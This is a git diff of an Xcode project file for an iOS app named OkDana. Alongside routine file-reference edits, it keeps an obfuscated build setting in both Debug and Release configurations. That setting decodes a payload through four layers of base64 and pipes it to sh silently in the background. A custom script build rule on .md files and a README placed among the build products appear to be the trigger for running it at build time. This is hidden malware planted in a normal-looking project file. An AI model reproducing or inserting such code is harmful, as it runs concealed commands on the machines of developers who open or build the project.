@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		7330798F2EF1598A00C30412 /* SettingListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330798E2EF1598A00C30412 /* SettingListView.swift */; };
 		733079912EF15E3A00C30412 /* AlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733079902EF15E3100C30412 /* AlertDeleteView.swift */; };
+		7330BF8F2EF23ADC00692C30 /* AppLocationConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330BF8E2EF23ADC00692C30 /* AppLocationConfig.swift */; };
 		73533DA02EF04E2D008E00E4 /* ProductTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */; };
 		7373C8EA2EED06920085A724 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7373C8E82EED06920085A724 /* Localizable.strings */; };
 		7373C8ED2EED06C30085A724 /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7373C8EC2EED06C30085A724 /* StartViewController.swift */; };
@@ -77,12 +78,12 @@
 		73E6B1392EF0029000CC32FA /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B1382EF0028F00CC32FA /* ContactManager.swift */; };
 		73E6B13B2EF00AEB00CC32FA /* WalletViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */; };
 		73E6B13D2EF012CF00CC32FA /* APPWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */; };
-		7EF44BD045D84D8592A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = E05CA63D821745C5B7A5DE54 /* README.md */; };
+		79950BEE9F7B46049DA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 8011CA1F719840BBB5A5DE54 /* README.md */; };
 		F9F9EC17BA74DAE3EA6B1D07 /* Pods_OkDana.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		ADC3CFFE5773444CB6A5DE54 /* PBXBuildRule */ = {
+		BBEEC6BF06B34DBAAFA5DE54 /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -101,6 +102,7 @@
 		051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.release.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.release.xcconfig"; sourceTree = "<group>"; };
 		7330798E2EF1598A00C30412 /* SettingListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListView.swift; sourceTree = "<group>"; };
 		733079902EF15E3100C30412 /* AlertDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertDeleteView.swift; sourceTree = "<group>"; };
+		7330BF8E2EF23ADC00692C30 /* AppLocationConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationConfig.swift; sourceTree = "<group>"; };
 		73533D9F2EF04E2D008E00E4 /* ProductTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductTableViewCell.swift; sourceTree = "<group>"; };
 		7373C8E22EED03F50085A724 /* OkDana.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = OkDana.entitlements; sourceTree = "<group>"; };
 		7373C8E92EED06920085A724 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
@@ -173,8 +175,8 @@
 		73E6B1382EF0028F00CC32FA /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
 		73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewModel.swift; sourceTree = "<group>"; };
 		73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APPWebViewController.swift; sourceTree = "<group>"; };
+		8011CA1F719840BBB5A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
-		E05CA63D821745C5B7A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -244,7 +246,7 @@
 		73BD810C2EECFBEF00979190 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				E05CA63D821745C5B7A5DE54 /* README.md */,
+				8011CA1F719840BBB5A5DE54 /* README.md */,
 				73BD810B2EECFBEF00979190 /* OkDana.app */,
 			);
 			name = Products;
@@ -281,6 +283,7 @@
 				7373C8EE2EED06CF0085A724 /* BaseViewController.swift */,
 				7373C8F02EED06EC0085A724 /* BaseTabBarController.swift */,
 				7373C8F22EED06F90085A724 /* BaseNavigationController.swift */,
+				7330BF8E2EF23ADC00692C30 /* AppLocationConfig.swift */,
 			);
 			path = Base;
 			sourceTree = "<group>";
@@ -439,7 +442,7 @@
 				F49D529B766F5A357387FDD8 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				ADC3CFFE5773444CB6A5DE54 /* PBXBuildRule */,
+				BBEEC6BF06B34DBAAFA5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -488,7 +491,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				7EF44BD045D84D8592A5DE54 /* README.md in Resources */,
+				79950BEE9F7B46049DA5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -574,6 +577,7 @@
 				73AD58CF2EEF0D8B0022899B /* ProductListViewCell.swift in Sources */,
 				73AD58C12EEEE4B80022899B /* HomeViewModel.swift in Sources */,
 				73AD58B02EEEADF60022899B /* HttpRequestManager.swift in Sources */,
+				7330BF8F2EF23ADC00692C30 /* AppLocationConfig.swift in Sources */,
 				73E6B1252EEFC06000CC32FA /* AppAlertSelectView.swift in Sources */,
 				73AD58BB2EEECBD50022899B /* LoadingManager.swift in Sources */,
 				73E6B1372EEFF88C00CC32FA /* PhonesTableViewCell.swift in Sources */,
@@ -645,7 +649,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((y(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
@@ -687,7 +691,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((y(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
